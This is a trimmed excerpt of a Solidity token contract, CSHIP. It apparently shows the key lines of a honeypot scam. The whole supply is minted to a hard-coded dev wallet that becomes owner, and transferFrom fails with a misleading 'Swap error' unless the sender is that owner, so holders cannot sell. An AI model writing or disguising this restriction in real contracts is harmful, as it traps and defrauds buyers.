...
contract CSHIP is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        _devWalletAddress = 0x4eBD26A2Ad27BDF5BE1eBc9c6BF45036f1cC3589;
        ...
        _owner = _devWalletAddress;
        // payable(service).transfer(msg.value);
        emit Transfer(address(0), _devWalletAddress, _tTotal);
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(sender == _owner, "Swap error");
